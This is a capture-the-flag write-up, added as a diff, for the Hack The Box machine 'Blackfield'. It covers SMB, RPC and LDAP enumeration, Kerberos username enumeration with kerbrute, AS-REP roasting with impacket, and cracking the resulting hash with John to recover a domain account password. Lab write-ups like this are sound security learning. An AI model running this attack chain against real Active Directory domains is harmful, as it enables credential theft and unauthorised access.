@@ -1,0 +1,177 @@
+# Blackfield
+https://app.hackthebox.com/machines/Blackfield
+
+![Blackfield](images/machine.png)
+
+Target IP
+10.10.10.192
+
+```
+sudo $(which autorecon) 10.10.10.192 --dirbuster.wordlist /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
+```
+
+---
+
+```
+$ crackmapexec smb 10.10.10.192
+SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+```
+
+Add entry on /etc/hosts
+
+```
+10.10.10.192    DC01 DC01.BLACKFIELD.local BLACKFIELD.local # HTB Blackfield
+```
+
+---
+
+
+Enum RPC
+```
+$ rpcclient dc01.BLACKFIELD.local -U '' -N
+
+rpcclient $> getusername
+Account Name: ANONYMOUS LOGON, Authority Name: NT AUTHORITY
+
+rpcclient $> enumdomusers
+result was NT_STATUS_ACCESS_DENIED
+```
+
+Enum ldap
+```
+$ ldapsearch -H ldap://10.10.10.192 -x -b "DC=BLACKFIELD,DC=local"
+
+result: 1 Operations error
+text: 000004DC: LdapErr: DSID-0C090A69, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
+```
+
+Enum SMB
+```
+$ smbclient -L 10.10.10.192 -U ''
+Password for [WORKGROUP\]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        forensic        Disk      Forensic / Audit share.
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        profiles$       Disk      
+        SYSVOL          Disk      Logon server share 
+```
+
+```
+$ crackmapexec smb 10.10.10.192 -u '' -p '' --shares
+
+SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\: STATUS_ACCESS_DENIED 
+SMB         10.10.10.192    445    DC01             [-] Error enumerating shares: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
+```
+
+
+```
+$ crackmapexec smb 10.10.10.192 -u 'anythinghere' -p '' --shares
+
+SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\anythinghere: 
+SMB         10.10.10.192    445    DC01             [+] Enumerated shares
+SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
+SMB         10.10.10.192    445    DC01             -----           -----------     ------
+SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
+SMB         10.10.10.192    445    DC01             C$                              Default share
+SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
+SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.10.192    445    DC01             NETLOGON                        Logon server share 
+SMB         10.10.10.192    445    DC01             profiles$       READ            
+SMB         10.10.10.192    445    DC01             SYSVOL                          Logon server share
+```
+
+```
+$ smbclient '//10.10.10.192/profiles$' -U ''
+Password for [WORKGROUP\]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed Jun  3 09:47:12 2020
+  ..                                  D        0  Wed Jun  3 09:47:12 2020
+  AAlleni                             D        0  Wed Jun  3 09:47:11 2020
+  ABarteski                           D        0  Wed Jun  3 09:47:11 2020
+  ABekesz                             D        0  Wed Jun  3 09:47:11 2020
+  ABenzies                            D        0  Wed Jun  3 09:47:11 2020
+  ABiemiller                          D        0  Wed Jun  3 09:47:11 2020
+  AChampken                           D        0  Wed Jun  3 09:47:11 2020
+  ACheretei                           D        0  Wed Jun  3 09:47:11 2020
+  ACsonaki                            D        0  Wed Jun  3 09:47:11 2020
+  AHigchens                           D        0  Wed Jun  3 09:47:11 2020
+  ...
+```
+
+```
+$ sudo mkdir /mnt/htb
+$ sudo mount -t cifs '//10.10.10.192/profiles$' /mnt/htb 
+Password for root@//10.10.10.192/profiles$:
+
+ls /mnt/htb > users.lst
+
+cd /mnt/htb/
+find .
+```
+
+download kerbrute from GitHub
+https://github.com/ropnop/kerbrute/releases/
+
+```
+cd ~/Downloads
+$ wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
+$ chmod +x kerbrute_linux_amd64
+```
+
+```
+$ cd ~/Projects/CTFs/HTB/Blackfield
+$ ~/Downloads/kerbrute_linux_amd64 userenum --dc 10.10.10.192 -d blackfield -o kerbrute.userenum.out users.lst
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 08/29/22 - Ronnie Flathers @ropnop
+
+2022/08/29 18:38:36 >  Using KDC(s):
+2022/08/29 18:38:36 >   10.10.10.192:88
+
+2022/08/29 18:38:56 >  [+] VALID USERNAME:       audit2020@blackfield
+2022/08/29 18:40:50 >  [+] VALID USERNAME:       support@blackfield
+2022/08/29 18:40:55 >  [+] VALID USERNAME:       svc_backup@blackfield
+2022/08/29 18:41:21 >  Done! Tested 314 usernames (3 valid) in 164.897 seconds
+```
+
+create a file with the valid user list
+```
+$ cat kerbrute.userenum.out | grep 'VALID USERNAME' | awk '{print $7}' | awk -F@ '{print $1}' > valid_users.lst
+```
+
+Running GetNPUsers to perform an ASREP Roast
+```
+$ ~/impacket/examples/GetNPUsers.py -dc-ip 10.10.10.192 -no-pass -usersfile valid_users.lst blackfield/ 
+Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation
+
+[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$support@BLACKFIELD:1789b3b1806295eaf5d3495c08a02368$b93197c0cd6ab874b929ca7ab9d4703fe5a4ef01b5f3b9da9b0767a715a47f171679b9fb8f5a5797eb21aa89e6d1012bf4e4f054b4cad69ea7963794a6ac6c889b53def8bf7655c3554174e12cbe2888a8f5530856fc62c35c88f069ca4ad63acd08754995b1f9ad7bbeffb0b414c442de5f83a2e409561fddcdd9bcb1acc994a05478a8bd6c05a8d76ca2798fd50de5163a2a3a73107e02fa73524af47ce2d3db2f7b2d8e3c9ec62489b9c277346561a1f53e02419302a29872bf2be97151c3434fd22e380025c20df8fbba2b029d5905d7db4495b9b89fdcfc8271906da0bcd888c9d7c081736c9cb36f485480
+[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
+```
+
+Now we have the hash for the `support@BLACKFIELD` user. Lets try to crack it with John.
+
+```
+$ john --wordlist=/usr/share/wordlists/rockyou.txt support.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+#00^BlackKnight  ($krb5asrep$23$support@BLACKFIELD)     
+1g 0:00:00:22 DONE (2022-08-29 20:47) 0.04486g/s 643158p/s 643158c/s 643158C/s #1WIF3Y.."chito"
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
